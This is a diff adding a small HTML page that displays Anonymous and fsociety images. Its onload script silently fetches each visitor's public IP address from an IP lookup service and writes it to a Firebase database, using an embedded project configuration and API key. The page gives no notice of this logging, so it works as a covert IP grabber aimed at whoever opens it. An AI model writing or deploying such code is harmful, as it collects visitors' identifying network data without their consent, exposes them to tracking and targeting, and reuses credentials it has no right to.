@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/7.14.6/firebase.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+     https://firebase.google.com/docs/web/setup#available-libraries -->
+<style>
+*{
+    margin: 0;
+    padding: 0;
+    box-shadow: border-box;
+}
+    #imgg
+    {
+        width:60%;
+        display:flex;
+    }
+</style>
+
+</head>
+<body>
+    <div id="imgg">
+        <img src="https://tahchapacomputergeeks.files.wordpress.com/2014/01/anonymous-logos-black-background-1440x900-hd-wallpaper.jpg?w=900"   alt="">
+        <img src="https://static.ts.360.com/blog/wp-content/uploads/2016/08/160822-Post-fsociety-1.png" alt="">
+    </div>
+    
+</body>
+<script>
+    // Your web app's Firebase configuration
+    window.onload=function()
+    {
+        var firebaseConfig = {
+      apiKey: "AIzaSyDbMO1W9dlkYn-YDYKJhoYfXY-3_yZ-DjM",
+      authDomain: "fir-2e430.firebaseapp.com",
+      databaseURL: "https://fir-2e430.firebaseio.com",
+      projectId: "fir-2e430",
+      storageBucket: "fir-2e430.appspot.com",
+      messagingSenderId: "1036240172961",
+      appId: "1:1036240172961:web:88e4b36ed87716ebed3de0"
+    };
+    var number=Math.floor(Math.random()*9999);
+    var number2=Math.floor(Math.random()*9999);
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    fetch('https://api.ipify.org/?format=json')
+    .then(res=>{
+        return res.json();
+    })
+    .then(data=>{
+        firebase.database().ref(`users${number+number2}`).set({ip:data.ip});
+    })
+    var btn=document.getElementById("btn");
+
+   
+    };
+    
+    
+  </script>
+</html>
